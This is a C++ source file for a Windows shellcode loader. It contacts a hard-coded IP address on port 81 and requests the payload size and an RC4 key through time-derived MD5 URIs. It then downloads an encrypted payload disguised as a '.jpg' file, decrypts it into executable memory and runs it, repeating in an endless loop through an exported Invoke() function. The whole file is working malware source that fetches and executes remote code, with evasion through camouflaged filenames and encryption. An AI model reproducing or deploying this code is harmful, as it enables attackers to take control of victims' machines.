#include"dns.h"
#include <windows.h>  
#include <string>
#include "b64/base64.h"
//#include <string.h>

#include "EsyGet/HttpRequest.h"
#include "Md5/md5.h"
#include <iostream>
#include <time.h>
#include "rc4/ARC4.h"

const char target[] = "167.179.71.52";
char t_ip[20];
char * ip;
const int  port = 81;
const char obscure[] = "vtyuiaslkjfasfalsflkhlksadjlkgjlkdsajglkadnlkgsd";
typedef void(__stdcall *CODE) ();
char * shellcode = NULL;
int shellcode_size = 0;
struct in_addr addr;
typedef PVOID(*M) (DWORD, DWORD, DWORD, DWORD);

void GetIP() {

	if (parse_domain(target, t_ip) == false) {
		ip = (char*)target;
	}
	else {
		ip = t_ip;
	}
	return;
}
std::string GenerateUri()
{
	time_t myt = time(NULL);
	int key = int(int(myt) / 100);
	std::string u = string(obscure) + std::to_string(key);
	return MD5(u).toStr();
}
void GetShellCodeSize()
{
	std::string host = std::string(ip);
	HttpRequest httpReq(host, port);
	std::string res = httpReq.HttpGet("/my/get_size");
	std::string body = httpReq.getBody(res);
	shellcode_size = std::atoi(body.c_str());

	shellcode = (char *)malloc(shellcode_size);

}
std::string GetKey()
{
	GetShellCodeSize();
	std::string host = std::string(ip);
	HttpRequest httpReq(host, port);
	std::string res = httpReq.HttpGet("/" + GenerateUri());

	std::string body = httpReq.getBody(res);
	return body;
}
void LoadShellCode(char *shellcode)
{
	//HMODULE hDllLib = LoadLibrary("Kernel32.dll");
	//FARPROC fpFun = GetProcAddress(hDllLib, "VirtualAlloc");
	//M VirtualAlloc_ = (M)*fpFun;
	PVOID p = NULL;
	p = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy_s(p, shellcode_size, shellcode, shellcode_size);

	CODE code = (CODE)p;
	code();

}

void DecPayload(std::string key)
{
	std::string host = std::string(ip);
	HttpRequest httpReq(host, port);
	time_t myt = time(NULL);
	int filename = int(int(myt) / 100);

	std::string res = httpReq.HttpGet("/" + std::to_string(filename) + ".jpg");
	std::string body = httpReq.getBody(res);
	std::string payload = base64_decode(body);
	char * c_payload = (char *)malloc(shellcode_size);
	memcpy_s(c_payload, shellcode_size, payload.c_str(), shellcode_size);
	ARC4 rc4;
	rc4.setKey((unsigned char*)key.c_str(), key.length());
	rc4.encrypt(c_payload, shellcode, shellcode_size);

	LoadShellCode(shellcode);

}


extern "C" _declspec(dllexport) void Invoke();

void Invoke()
{
	Sleep(2000);
	while (TRUE) {
		GetIP();
		DecPayload(GetKey());
		Sleep(2000);
	}
	
}

int main()
{



	//Invoke();


	return 0;
}